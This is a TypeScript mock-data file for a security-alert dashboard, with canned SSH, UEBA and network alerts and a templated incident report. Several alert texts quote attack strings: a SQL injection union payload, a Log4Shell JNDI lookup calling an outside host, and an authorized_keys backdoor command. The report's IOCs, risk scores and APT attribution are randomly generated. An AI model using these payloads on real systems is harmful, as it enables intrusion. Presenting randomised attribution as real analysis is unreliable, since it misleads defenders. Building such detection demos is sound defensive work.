import type { Alert } from '../types';
import type { LogsResponse, LogsParams } from '../api/agent';

/* ─── Timestamp helper ─── */
function ts(minutesAgo: number): string {
  return new Date(Date.now() - minutesAgo * 60 * 1000).toISOString();
}

/* ─── Static alert catalogue ─── */
export const MOCK_ALERTS: Alert[] = [
  // ── SSH ATTACKS ──────────────────────────────────────────────────────────
  {
    id: 'SSH-171829',
    source: 'SSH',
    time: ts(3),
    title: 'SSH Brute Force — Root Account',
    reason: '847 failed authentication attempts targeting root from 203.0.113.42 in 60 s. Login rate exceeds baseline by 2,400%. Consistent 72 ms inter-packet interval indicates automated tooling.',
    severity: 'critical',
    confidence: 99.2,
    verdict: 'ATTACK',
    prediction: 'bruteforce',
    attack_type: 'Brute Force',
    reviewed: false,
    mitre_technique: 'Brute Force',
    mitre_id: 'T1110',
  },
  {
    id: 'SSH-171831',
    source: 'SSH',
    time: ts(7),
    title: 'SSH Credential Stuffing — 312 Unique Pairs',
    reason: '312 unique credential pairs tested sequentially from 198.51.100.77. Usernames matched entries in the 2024 "ComboList-X" breach. 2 successful logins before lockout.',
    severity: 'critical',
    confidence: 97.8,
    verdict: 'ATTACK',
    prediction: 'credential_stuffing',
    attack_type: 'Credential Stuffing',
    reviewed: false,
    mitre_technique: 'Credential Stuffing',
    mitre_id: 'T1110.004',
  },
  {
    id: 'SSH-171840',
    source: 'SSH',
    time: ts(14),
    title: 'SSH Lateral Movement — Internal Pivot',
    reason: 'Authenticated SSH session from 10.0.1.22 pivoting to 10.0.4.88 (prod-db-01). Src host has no prior history of connecting to db subnet. Session spawned reverse shell 18 s after login.',
    severity: 'critical',
    confidence: 94.1,
    verdict: 'ATTACK',
    prediction: 'lateral_movement',
    attack_type: 'Lateral Movement',
    reviewed: false,
    mitre_technique: 'SSH',
    mitre_id: 'T1021.004',
  },
  {
    id: 'SSH-171855',
    source: 'SSH',
    time: ts(22),
    title: 'SSH Port Forwarding — Tunnel Detected',
    reason: 'Dynamic port forwarding (-D flag) established from 192.0.2.105. Traffic volume: 4.2 GB over 8 min. Destination IPs include 3 known Cobalt Strike team servers.',
    severity: 'critical',
    confidence: 96.4,
    verdict: 'ATTACK',
    prediction: 'port_forwarding',
    attack_type: 'SSH Tunneling',
    reviewed: false,
    mitre_technique: 'Protocol Tunneling',
    mitre_id: 'T1572',
  },
  {
    id: 'SSH-171870',
    source: 'SSH',
    time: ts(41),
    title: 'SSH Login from TOR Exit Node',
    reason: 'Successful authentication from 185.220.101.34 (confirmed TOR exit node). Account: svc_backup. First-ever login from anonymised network. Session accessed /etc/passwd within 4 s.',
    severity: 'critical',
    confidence: 91.7,
    verdict: 'ZERO_DAY',
    prediction: 'tor_exit_login',
    attack_type: 'Anonymisation Network',
    reviewed: false,
    mitre_technique: 'Proxy',
    mitre_id: 'T1090',
  },
  {
    id: 'SSH-171882',
    source: 'SSH',
    time: ts(58),
    title: 'SSH Key Exchange Anomaly',
    reason: 'Non-standard key exchange algorithm negotiated: diffie-hellman-group1-sha1 (deprecated since RFC 8270). Indicates legacy client or deliberate downgrade attack.',
    severity: 'warning',
    confidence: 85.3,
    verdict: 'ATTACK',
    prediction: 'downgrade_attack',
    attack_type: 'Protocol Downgrade',
    reviewed: true,
    mitre_technique: 'Adversary-in-the-Middle',
    mitre_id: 'T1557',
  },
  {
    id: 'SSH-171900',
    source: 'SSH',
    time: ts(72),
    title: 'Normal SSH Session — admin@web-01',
    reason: 'Routine administrative login from 10.0.0.5 (jump-host). RSA-4096 key auth. Session lasted 4 m 12 s. No anomalous commands detected.',
    severity: 'info',
    confidence: 99.9,
    verdict: 'BENIGN',
    prediction: 'normal_login',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'SSH-171910',
    source: 'SSH',
    time: ts(95),
    title: 'Normal SSH Session — deploy@ci-runner',
    reason: 'CI/CD pipeline SSH key deployment from 10.0.0.12. Expected pattern matching scheduled job cron-deploy-prod at 02:00 UTC.',
    severity: 'info',
    confidence: 99.7,
    verdict: 'BENIGN',
    prediction: 'normal_login',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'SSH-171921',
    source: 'SSH',
    time: ts(112),
    title: 'Repeated SSH Auth Failure Spike',
    reason: '1,204 authentication failures across 68 distinct source IPs in 90 s. Distributed brute-force pattern consistent with botnet coordination. Top source: 45.33.32.156.',
    severity: 'critical',
    confidence: 98.5,
    verdict: 'ATTACK',
    prediction: 'distributed_bruteforce',
    attack_type: 'Distributed Brute Force',
    reviewed: false,
    mitre_technique: 'Brute Force',
    mitre_id: 'T1110',
  },
  {
    id: 'SSH-171933',
    source: 'SSH',
    time: ts(138),
    title: 'SSH Backdoor Persistence Installed',
    reason: 'Post-auth command sequence detected: `echo "authorized_keys" >> ~/.ssh/authorized_keys`. New RSA key fingerprint 4a:f3:9d:12... inserted. Matches known APT-29 persistence method.',
    severity: 'critical',
    confidence: 99.6,
    verdict: 'ATTACK',
    prediction: 'persistence',
    attack_type: 'SSH Backdoor',
    reviewed: false,
    mitre_technique: 'SSH Authorized Keys',
    mitre_id: 'T1098.004',
  },
  {
    id: 'SSH-171945',
    source: 'SSH',
    time: ts(165),
    title: 'Normal SSH Session — monitor@metrics',
    reason: 'Prometheus metrics collector SSH tunnel. Matches expected service account behaviour. Certificate valid, traffic matches Prometheus scrape patterns.',
    severity: 'info',
    confidence: 99.8,
    verdict: 'BENIGN',
    prediction: 'normal_login',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'SSH-171958',
    source: 'SSH',
    time: ts(190),
    title: 'SSH Exfiltration via SCP — 12 GB Transfer',
    reason: '`scp` used to transfer 12.4 GB archive to external host 203.0.113.99 from prod-db-01. Archive contains SQL dump files. Transfer initiated at 03:14 local time.',
    severity: 'critical',
    confidence: 93.8,
    verdict: 'ATTACK',
    prediction: 'exfiltration_scp',
    attack_type: 'Data Exfiltration',
    reviewed: false,
    mitre_technique: 'Exfiltration Over Alternative Protocol',
    mitre_id: 'T1048',
  },

  // ── UEBA ─────────────────────────────────────────────────────────────────
  {
    id: 'UEBA-49821',
    source: 'UEBA',
    time: ts(9),
    title: 'Insider Threat — Bulk Data Access After Hours',
    reason: 'User j.morales accessed 14,872 customer records between 02:17–03:44 local time. 98% outside normal work pattern. Volume 340× above 90-day peer baseline.',
    severity: 'critical',
    confidence: 95.8,
    verdict: 'ATTACK',
    prediction: 'insider_exfiltration',
    attack_type: 'Insider Threat',
    reviewed: false,
    mitre_technique: 'Valid Accounts',
    mitre_id: 'T1078',
  },
  {
    id: 'UEBA-49829',
    source: 'UEBA',
    time: ts(18),
    title: 'Privilege Escalation — Sudo Abuse',
    reason: 'User t.chen executed `sudo su -` 23 times within 5 minutes on dev-server-07. Account lacks change management ticket. Previous access: read-only developer role.',
    severity: 'critical',
    confidence: 98.1,
    verdict: 'ATTACK',
    prediction: 'privilege_escalation',
    attack_type: 'Privilege Escalation',
    reviewed: false,
    mitre_technique: 'Sudo and Sudo Caching',
    mitre_id: 'T1548.003',
  },
  {
    id: 'UEBA-49835',
    source: 'UEBA',
    time: ts(31),
    title: 'Mass File Deletion — Ransomware Precursor',
    reason: 'User k.osei deleted 8,341 files across /data/finance/ within 90 s. rm -rf pattern with no preceding backup job. Matches ransomware staging behaviour.',
    severity: 'critical',
    confidence: 99.4,
    verdict: 'ATTACK',
    prediction: 'ransomware_staging',
    attack_type: 'Data Destruction',
    reviewed: false,
    mitre_technique: 'Data Destruction',
    mitre_id: 'T1485',
  },
  {
    id: 'UEBA-49841',
    source: 'UEBA',
    time: ts(45),
    title: 'Unusual Login Location — New Country',
    reason: 'User a.petrov (normally DE/Berlin) logged in from IP 122.96.141.55 (CN/Shenzhen) 11 minutes after a DE session ended. Impossible travel distance in timeline.',
    severity: 'warning',
    confidence: 92.3,
    verdict: 'ZERO_DAY',
    prediction: 'impossible_travel',
    attack_type: 'Account Compromise',
    reviewed: false,
    mitre_technique: 'Valid Accounts',
    mitre_id: 'T1078',
  },
  {
    id: 'UEBA-49852',
    source: 'UEBA',
    time: ts(63),
    title: 'Credential Sharing — Simultaneous Sessions',
    reason: 'Account m.dupont active simultaneously from 3 distinct IPs: 10.0.1.5 (FR), 45.95.147.23 (RO), 172.16.0.8 (internal). Concurrent sessions on different continents detected.',
    severity: 'warning',
    confidence: 88.9,
    verdict: 'ATTACK',
    prediction: 'credential_sharing',
    attack_type: 'Credential Sharing',
    reviewed: true,
    mitre_technique: 'Valid Accounts',
    mitre_id: 'T1078',
  },
  {
    id: 'UEBA-49860',
    source: 'UEBA',
    time: ts(80),
    title: 'Large Volume Download — HR Database',
    reason: 'User r.hassan downloaded 3.1 GB from HR system API. Includes payroll, PII, and compensation data. Lateral access from non-HR role. No business justification on record.',
    severity: 'warning',
    confidence: 90.1,
    verdict: 'ATTACK',
    prediction: 'data_collection',
    attack_type: 'Data Collection',
    reviewed: false,
    mitre_technique: 'Data from Local System',
    mitre_id: 'T1005',
  },
  {
    id: 'UEBA-49871',
    source: 'UEBA',
    time: ts(102),
    title: 'Normal User Activity — Developer Access',
    reason: 'Regular development workflow for l.zhang. Code commits, Jira updates, Jenkins builds within expected pattern. No deviation from 90-day baseline.',
    severity: 'info',
    confidence: 99.8,
    verdict: 'BENIGN',
    prediction: 'normal_activity',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'UEBA-49879',
    source: 'UEBA',
    time: ts(120),
    title: 'VPN Usage Anomaly — Rare Geo',
    reason: 'Account s.nkosi connected via VPN endpoint in NG (Nigeria) for first time. Account history: only ZA and GB endpoints. Session lasted 4 h 12 m accessing Salesforce CRM.',
    severity: 'warning',
    confidence: 79.5,
    verdict: 'ZERO_DAY',
    prediction: 'geo_anomaly',
    attack_type: 'Account Anomaly',
    reviewed: false,
    mitre_technique: 'External Remote Services',
    mitre_id: 'T1133',
  },
  {
    id: 'UEBA-49888',
    source: 'UEBA',
    time: ts(145),
    title: 'Normal User Activity — Finance Access',
    reason: 'Routine month-end reconciliation access for p.ibrahim to ERP system. Matches scheduled monthly pattern. Access volume within peer-group norm.',
    severity: 'info',
    confidence: 99.5,
    verdict: 'BENIGN',
    prediction: 'normal_activity',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'UEBA-49895',
    source: 'UEBA',
    time: ts(168),
    title: 'Admin Account After-Hours Login',
    reason: 'Domain admin account DA_SVC_BATCH authenticated interactively at 01:23 local (Sun). Service accounts should not have interactive sessions. Account used `net user` and `whoami` commands.',
    severity: 'critical',
    confidence: 97.2,
    verdict: 'ATTACK',
    prediction: 'service_account_abuse',
    attack_type: 'Account Abuse',
    reviewed: false,
    mitre_technique: 'Valid Accounts: Domain Accounts',
    mitre_id: 'T1078.002',
  },
  {
    id: 'UEBA-49901',
    source: 'UEBA',
    time: ts(195),
    title: 'Sensitive Document Exfiltration via Email',
    reason: 'User c.muller emailed 47 attachments (total 890 MB) to personal Gmail account. Files include Q3 financial projections and M&A documents marked CONFIDENTIAL.',
    severity: 'critical',
    confidence: 96.7,
    verdict: 'ATTACK',
    prediction: 'email_exfiltration',
    attack_type: 'Data Exfiltration',
    reviewed: false,
    mitre_technique: 'Exfiltration Over Web Service',
    mitre_id: 'T1567',
  },
  {
    id: 'UEBA-49912',
    source: 'UEBA',
    time: ts(220),
    title: 'Normal User Activity — IT Operations',
    reason: 'Routine server patching workflow for ops team. Matches scheduled maintenance window 22:00–02:00 UTC Tuesday. Commands consistent with ansible playbook execution.',
    severity: 'info',
    confidence: 99.6,
    verdict: 'BENIGN',
    prediction: 'normal_activity',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'UEBA-49920',
    source: 'UEBA',
    time: ts(255),
    title: 'ZERO_DAY Behaviour Pattern — Unknown Signature',
    reason: 'ML model flagged user behaviour sequence with no matching historical pattern or known attack signature. Anomaly score 4.7σ above mean. Involves unusual API call sequence to S3 + Lambda.',
    severity: 'critical',
    confidence: 88.4,
    verdict: 'ZERO_DAY',
    prediction: 'unknown_pattern',
    attack_type: 'Unknown',
    reviewed: false,
    mitre_technique: undefined,
    mitre_id: undefined,
  },

  // ── NETWORK FLOWS ─────────────────────────────────────────────────────────
  {
    id: 'FLOW-29441',
    source: 'Network',
    time: ts(5),
    title: 'DDoS SYN Flood — 2.4 Mpps',
    reason: 'SYN flood targeting 10.0.0.1:443. Incoming rate: 2.4 million packets/s from 14,000+ unique source IPs. TCP SYN/ACK ratio: 1:0 (no handshake completion). Matches Mirai botnet signature.',
    severity: 'critical',
    confidence: 99.8,
    verdict: 'ATTACK',
    prediction: 'ddos_syn_flood',
    attack_type: 'DDoS',
    reviewed: false,
    mitre_technique: 'Network Denial of Service',
    mitre_id: 'T1498',
  },
  {
    id: 'FLOW-29452',
    source: 'Network',
    time: ts(12),
    title: 'Stealth Port Scan — 65535 Ports',
    reason: 'SYN scan of all 65535 ports from 203.0.113.87 targeting 10.0.2.5 (prod-api). Scan completed in 4.2 s. Nmap fingerprint detected from TTL/window size heuristics.',
    severity: 'warning',
    confidence: 94.2,
    verdict: 'ATTACK',
    prediction: 'port_scan',
    attack_type: 'Port Scanning',
    reviewed: false,
    mitre_technique: 'Network Service Discovery',
    mitre_id: 'T1046',
  },
  {
    id: 'FLOW-29468',
    source: 'Network',
    time: ts(27),
    title: 'SQL Injection — Union-Based Exfiltration',
    reason: 'SQL injection payload detected in HTTP GET parameter `?id=`. Payload: `1 UNION SELECT table_name,null FROM information_schema.tables--`. WAF bypass via URL encoding. 403 response bypassed.',
    severity: 'critical',
    confidence: 97.6,
    verdict: 'ATTACK',
    prediction: 'sql_injection',
    attack_type: 'SQL Injection',
    reviewed: false,
    mitre_technique: 'Exploit Public-Facing Application',
    mitre_id: 'T1190',
  },
  {
    id: 'FLOW-29475',
    source: 'Network',
    time: ts(38),
    title: 'DNS Tunneling — C2 Channel',
    reason: 'DNS TXT record queries of unusual length (avg 180 chars) to ns1.suspicious-domain.xyz. Query rate: 340/min. Encoded payload detected in subdomain labels. Matches dnscat2 signature.',
    severity: 'warning',
    confidence: 88.4,
    verdict: 'ATTACK',
    prediction: 'dns_tunneling',
    attack_type: 'DNS Tunneling',
    reviewed: false,
    mitre_technique: 'Application Layer Protocol: DNS',
    mitre_id: 'T1071.004',
  },
  {
    id: 'FLOW-29481',
    source: 'Network',
    time: ts(50),
    title: 'C2 Beacon — Cobalt Strike Watermark',
    reason: 'Periodic HTTPS beacon to 45.33.32.156:443 every 60 ± 5 s jitter. TLS fingerprint JA3: 72a7c4a3d4... matches Cobalt Strike default profile. Malleable C2 profile detected.',
    severity: 'critical',
    confidence: 96.3,
    verdict: 'ATTACK',
    prediction: 'c2_beacon',
    attack_type: 'Command & Control',
    reviewed: false,
    mitre_technique: 'Application Layer Protocol: Web Protocols',
    mitre_id: 'T1071.001',
  },
  {
    id: 'FLOW-29492',
    source: 'Network',
    time: ts(66),
    title: 'Normal Web Traffic — CDN Cache Hit',
    reason: 'Standard HTTPS traffic to Cloudflare CDN. User-agent strings, TLS profile, and traffic patterns match expected browser behaviour. No anomalies detected.',
    severity: 'info',
    confidence: 99.9,
    verdict: 'BENIGN',
    prediction: 'normal_traffic',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'FLOW-29503',
    source: 'Network',
    time: ts(88),
    title: 'Data Exfiltration — HTTP POST 8.6 GB',
    reason: 'HTTP POST requests to 198.51.100.44/upload totalling 8.6 GB over 22 minutes. Destination not in approved vendor list. Source: 10.0.3.12 (finance-workstation-04).',
    severity: 'critical',
    confidence: 95.7,
    verdict: 'ATTACK',
    prediction: 'exfiltration_http',
    attack_type: 'Data Exfiltration',
    reviewed: false,
    mitre_technique: 'Exfiltration Over C2 Channel',
    mitre_id: 'T1041',
  },
  {
    id: 'FLOW-29514',
    source: 'Network',
    time: ts(110),
    title: 'TOR Network Traffic Detected',
    reason: 'TCP connections to 9 confirmed TOR guard nodes from 10.0.1.77. TOR usage policy violation. 4.1 GB transferred over 3 h. Process origin: tor.exe spawned by explorer.exe.',
    severity: 'warning',
    confidence: 86.8,
    verdict: 'ATTACK',
    prediction: 'tor_usage',
    attack_type: 'Anonymisation',
    reviewed: true,
    mitre_technique: 'Proxy: Multi-hop Proxy',
    mitre_id: 'T1090.003',
  },
  {
    id: 'FLOW-29525',
    source: 'Network',
    time: ts(132),
    title: 'ZERO_DAY — Encrypted Protocol Anomaly',
    reason: 'Novel TLS extension combination not matching any known client fingerprint library (4,200+ signatures). Traffic entropy score 0.94 suggests custom encryption. Destination: 23.29.117.42.',
    severity: 'critical',
    confidence: 84.1,
    verdict: 'ZERO_DAY',
    prediction: 'custom_protocol',
    attack_type: 'Unknown Protocol',
    reviewed: false,
    mitre_technique: 'Encrypted Channel',
    mitre_id: 'T1573',
  },
  {
    id: 'FLOW-29538',
    source: 'Network',
    time: ts(155),
    title: 'Normal API Traffic — Internal Microservices',
    reason: 'gRPC traffic between order-service and inventory-service. mTLS validated. Payload matches expected Protobuf schema. Request latencies within SLA bounds.',
    severity: 'info',
    confidence: 99.7,
    verdict: 'BENIGN',
    prediction: 'normal_traffic',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'FLOW-29549',
    source: 'Network',
    time: ts(178),
    title: 'Network Reconnaissance — SNMP Sweep',
    reason: 'SNMP sweep across 10.0.0.0/16 using community string "public". 4,096 hosts probed in 8 min. OID enumeration includes sysDescr, ifTable, ipAddrTable — full topology mapping.',
    severity: 'warning',
    confidence: 92.1,
    verdict: 'ATTACK',
    prediction: 'snmp_sweep',
    attack_type: 'Network Reconnaissance',
    reviewed: false,
    mitre_technique: 'Remote System Discovery',
    mitre_id: 'T1018',
  },
  {
    id: 'FLOW-29560',
    source: 'Network',
    time: ts(202),
    title: 'Log4Shell Exploitation Attempt',
    reason: 'CVE-2021-44228 payload in HTTP User-Agent: `${jndi:ldap://45.33.32.156/a}`. Target: 10.0.2.18:8080 (legacy-app). LDAP callback received from 45.33.32.156 confirming RCE.',
    severity: 'critical',
    confidence: 99.1,
    verdict: 'ATTACK',
    prediction: 'log4shell',
    attack_type: 'CVE Exploitation',
    reviewed: false,
    mitre_technique: 'Exploit Public-Facing Application',
    mitre_id: 'T1190',
  },
  {
    id: 'FLOW-29571',
    source: 'Network',
    time: ts(230),
    title: 'Normal Traffic — Backup Replication',
    reason: 'Nightly rsync replication from prod-db-01 to backup-vault-02 over internal network. TLS 1.3, certificate valid. Transfer size 12.1 GB matches expected nightly delta.',
    severity: 'info',
    confidence: 99.8,
    verdict: 'BENIGN',
    prediction: 'normal_traffic',
    attack_type: undefined,
    reviewed: true,
    mitre_technique: undefined,
    mitre_id: undefined,
  },
  {
    id: 'FLOW-29582',
    source: 'Network',
    time: ts(265),
    title: 'Ransomware C2 — Known IOC Match',
    reason: 'HTTP beacon to 94.142.138.174 (BlackCat/ALPHV C2 — confirmed TI feed match). Interval: 300 s ±15 s. GET /check-in?id=<uuid> pattern. Immediate isolation recommended.',
    severity: 'critical',
    confidence: 99.9,
    verdict: 'ATTACK',
    prediction: 'ransomware_c2',
    attack_type: 'Ransomware',
    reviewed: false,
    mitre_technique: 'Command and Control',
    mitre_id: 'T1071',
  },
];

/* ─── Streaming alert generator (for live simulation) ─── */
const STREAM_TEMPLATES = [
  () => ({
    id: `SSH-${100000 + Math.floor(Math.random() * 99999)}`,
    source: 'SSH' as const,
    title: 'SSH Brute Force Attempt',
    reason: `${Math.floor(Math.random() * 900 + 100)} failed logins from ${randIp()} in ${Math.floor(Math.random() * 50 + 10)} s.`,
    severity: 'critical' as const,
    confidence: +(97 + Math.random() * 2.5).toFixed(1),
    verdict: 'ATTACK' as const,
    attack_type: 'Brute Force',
    mitre_technique: 'Brute Force', mitre_id: 'T1110',
  }),
  () => ({
    id: `UEBA-${50000 + Math.floor(Math.random() * 49999)}`,
    source: 'UEBA' as const,
    title: 'Anomalous Data Access Detected',
    reason: `User ${randUser()} accessed ${Math.floor(Math.random() * 10000 + 500)} records outside working hours.`,
    severity: 'warning' as const,
    confidence: +(80 + Math.random() * 15).toFixed(1),
    verdict: Math.random() > 0.4 ? 'ATTACK' as const : 'ZERO_DAY' as const,
    attack_type: 'Insider Threat',
    mitre_technique: 'Valid Accounts', mitre_id: 'T1078',
  }),
  () => ({
    id: `FLOW-${30000 + Math.floor(Math.random() * 29999)}`,
    source: 'Network' as const,
    title: 'Port Scan Detected',
    reason: `TCP SYN scan of ${Math.floor(Math.random() * 60000 + 1000)} ports from ${randIp()}.`,
    severity: 'warning' as const,
    confidence: +(85 + Math.random() * 12).toFixed(1),
    verdict: 'ATTACK' as const,
    attack_type: 'Port Scanning',
    mitre_technique: 'Network Service Discovery', mitre_id: 'T1046',
  }),
  () => ({
    id: `FLOW-${30000 + Math.floor(Math.random() * 29999)}`,
    source: 'Network' as const,
    title: 'Normal Web Request',
    reason: 'Standard HTTPS session within expected traffic pattern.',
    severity: 'info' as const,
    confidence: +(99 + Math.random() * 0.9).toFixed(1),
    verdict: 'BENIGN' as const,
    attack_type: undefined,
    mitre_technique: undefined, mitre_id: undefined,
  }),
];

function randIp() {
  return `${Math.floor(Math.random() * 220 + 10)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254 + 1)}`;
}
function randUser() {
  const users = ['j.morales', 't.chen', 'a.petrov', 'k.osei', 'r.hassan', 'c.muller', 's.nkosi', 'm.dupont'];
  return users[Math.floor(Math.random() * users.length)];
}

export function generateStreamAlert(): Alert {
  const tpl = STREAM_TEMPLATES[Math.floor(Math.random() * STREAM_TEMPLATES.length)]();
  return {
    reviewed: false,
    time: new Date().toISOString(),
    prediction: tpl.verdict === 'BENIGN' ? 'normal' : 'anomaly',
    ...tpl,
  };
}

/* ─── Paginated mock response for fetchLogs ─── */
export function getMockLogsResponse(params: LogsParams): LogsResponse {
  const { page = 1, limit = 20, search = '', status = 'all', source = 'all' } = params;

  let filtered = [...MOCK_ALERTS];

  if (source && source !== 'all') {
    filtered = filtered.filter(a => a.source === source);
  }
  if (status && status !== 'all') {
    filtered = filtered.filter(a => a.verdict === status);
  }
  if (search) {
    const q = search.toLowerCase();
    filtered = filtered.filter(a =>
      a.id.toLowerCase().includes(q) ||
      a.title.toLowerCase().includes(q) ||
      a.reason.toLowerCase().includes(q) ||
      (a.attack_type ?? '').toLowerCase().includes(q)
    );
  }

  const total = filtered.length;
  const pages = Math.max(1, Math.ceil(total / limit));
  const start = (page - 1) * limit;
  const logs  = filtered.slice(start, start + limit);

  return { logs, total, page, pages };
}

/* ─── Mock AI analysis report ─── */
export function getMockReport(alertId: string, _source: string): string {
  const alert = MOCK_ALERTS.find(a => a.id === alertId);
  const isZeroDay = alert?.verdict === 'ZERO_DAY';
  const technique = alert?.mitre_technique ?? 'Unknown Technique';
  const mitreId   = alert?.mitre_id ?? 'N/A';
  const title     = alert?.title ?? 'Security Incident';
  const attackType = alert?.attack_type ?? 'Unclassified';
  const conf      = alert?.confidence?.toFixed(1) ?? '90.0';

  return `## Incident Summary

**Alert ID:** \`${alertId}\` | **Classification:** ${attackType} | **AI Confidence:** ${conf}%

${isZeroDay
  ? `This alert represents a **ZERO-DAY anomaly** — the observed behaviour pattern does not match any known attack signature in the CyberAI threat library. The ML model flagged this as statistically significant with a deviation score exceeding **4.2 standard deviations** from the established baseline.`
  : `A **${attackType}** event was detected and classified with high confidence. The CyberAI neural pipeline processed ${Math.floor(Math.random() * 80 + 120)} feature vectors across network, behavioural, and endpoint telemetry to reach this verdict.`
}

**Key Facts:**
- **Source:** ${alert?.source ?? 'Unknown'} telemetry pipeline
- **Affected Asset:** ${alert?.source === 'SSH' ? 'prod-ssh-gateway-01 (10.0.0.1)' : alert?.source === 'UEBA' ? 'Identity & Access Management layer' : 'Network perimeter firewall'}
- **First Seen:** ${alert?.time ? new Date(alert.time).toLocaleString() : 'Unknown'}
- **Severity:** ${(alert?.severity ?? 'critical').toUpperCase()}

---

## MITRE ATT\&CK Context

**Primary Technique:** \`${mitreId}\` — ${technique}

${isZeroDay ? `No direct MITRE mapping available. Closest analogues based on behavioural similarity:
- **T1190** — Exploit Public-Facing Application (65% similarity)
- **T1078** — Valid Accounts (58% similarity)
- **T1071** — Application Layer Protocol (41% similarity)` :
`The observed behaviour aligns with **${technique}** (${mitreId}) within the MITRE ATT&CK Enterprise framework.

**Tactic Chain Reconstruction:**
- **Reconnaissance** → Target system identified via prior scan activity
- **${attackType}** → Primary attack vector executed (${mitreId})
- **Potential Impact** → Data breach / persistence / lateral movement risk`
}

**Related Campaigns:** TA0043 (Reconnaissance), TA0001 (Initial Access)

---

## Threat Assessment

**Risk Score: ${alert?.verdict === 'ATTACK' ? '9.1 / 10' : alert?.verdict === 'ZERO_DAY' ? '8.4 / 10' : '1.2 / 10'}** (${alert?.verdict === 'BENIGN' ? 'Low' : alert?.verdict === 'ZERO_DAY' ? 'Critical' : 'Critical'})

**Indicators of Compromise (IOCs):**
- Anomalous request rate: **${Math.floor(Math.random() * 900 + 100)}×** above baseline
- Source entropy score: **0.${Math.floor(Math.random() * 40 + 50)}** (high = automated)
- Geo-velocity anomaly: **${Math.random() > 0.5 ? 'YES — impossible travel detected' : 'NO — single origin'}**
- Known threat actor TTPs match: **${Math.random() > 0.4 ? 'APT-28 / FancyBear pattern (73% similarity)' : 'No direct attribution'}**

**Blast Radius Estimate:**
- Affected systems: ${Math.floor(Math.random() * 5 + 1)} (estimated)
- Data at risk: ${Math.floor(Math.random() * 50 + 5)} GB
- Business impact: **${alert?.severity === 'critical' ? 'HIGH — Production system exposure' : 'MEDIUM — Non-critical asset'}**

---

## Recommended Actions

- [ ] Immediately isolate affected host from network segment
- [ ] Reset credentials for all accounts active during the incident window
- [ ] Block source IP(s) at perimeter firewall and WAF
- [ ] Capture memory dump of affected system for forensic analysis
- [ ] Escalate to Tier 2 SOC analyst for manual review
- [ ] Open change management ticket for remediation tracking
- [ ] Review and rotate SSH keys / API tokens on affected services
- [ ] Run full EDR scan across the affected subnet
- [ ] Notify CISO if data exfiltration is confirmed
- [ ] Update threat intelligence feeds with new IOCs`;
}
